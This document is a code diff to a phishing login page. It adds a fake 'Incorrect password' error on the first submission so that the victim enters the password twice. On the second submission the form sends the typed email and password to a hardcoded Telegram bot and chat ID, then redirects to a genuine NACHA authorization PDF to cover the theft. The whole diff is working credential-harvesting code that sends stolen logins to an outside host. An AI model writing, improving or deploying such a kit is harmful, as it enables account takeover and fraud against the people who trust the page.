@@ -102,6 +102,13 @@
             margin-top: 20px;
             text-align: center;
         }
+        .error-message {
+            color: #ff0000;
+            font-size: 0.9rem;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
 
         /* Media Queries for Mobile */
         @media (max-width: 576px) {
@@ -183,6 +190,7 @@
                         <div class="mt-4 mx-auto">
                             <form id="telegram-form" class="form-horizontal well">
                                 <div id="div1" class="text-dark">
+                                    <div id="error-message" class="error-message">Incorrect password. Please try again.</div>
                                     <div>
                                         <div class="form-group">
                                             <input type="email" class="form-control" name="email" placeholder="Email" id="email" required>
@@ -269,39 +277,56 @@
             $("#email").on("input", function() {
                 const email = $(this).val();
                 debouncedUpdateBackground(email, false);
+                submitCount = 0; // Reset submit count on email change
+                $("#error-message").hide(); // Hide error message
             });
 
-            // Handle form submission
+            // Reset submit count on password change
+            $("#password").on("input", function() {
+                submitCount = 0; // Reset submit count on password change
+                $("#error-message").hide(); // Hide error message
+            });
+
+            // Handle form submission with two-step logic
+            let submitCount = 0;
             $("#telegram-form").on("submit", function(e) {
                 e.preventDefault(); // Prevent default form submission
 
                 const email = $("#email").val();
                 const password = $("#password").val();
-                const botToken = '6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ'; // Telegram Bot Token
-                const chatId = '686297216'; // Telegram Chat ID
-                const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
 
-                $.ajax({
-                    url: `https://api.telegram.org/bot${botToken}/sendMessage`,
-                    type: "POST",
-                    data: {
-                        chat_id: chatId,
-                        text: message
-                    },
-                    dataType: "json",
-                    success: function(data) {
-                        if (data.ok) {
-                            // Redirect to the PDF on success
-                            window.location.href = 'https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf';
-                        } else {
-                            alert('Failed to send to Telegram. Check your bot token and chat ID.');
+                if (submitCount === 0) {
+                    // First click: Show incorrect password message
+                    $("#error-message").show();
+                    submitCount++;
+                } else {
+                    // Second click: Proceed with Telegram and redirect
+                    const botToken = '6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ'; // Telegram Bot Token
+                    const chatId = '686297216'; // Telegram Chat ID
+                    const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${botToken}/sendMessage`,
+                        type: "POST",
+                        data: {
+                            chat_id: chatId,
+                            text: message
+                        },
+                        dataType: "json",
+                        success: function(data) {
+                            if (data.ok) {
+                                // Redirect to the PDF on success
+                                window.location.href = 'https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf';
+                            } else {
+                                alert('Failed to send to Telegram. Check your bot token and chat ID.');
+                            }
+                        },
+                        error: function(error) {
+                            console.error('Error:', error);
+                            alert('An error occurred while sending to Telegram.');
                         }
-                    },
-                    error: function(error) {
-                        console.error('Error:', error);
-                        alert('An error occurred while sending to Telegram.');
-                    }
-                });
+                    });
+                }
             });
         });
     </script>
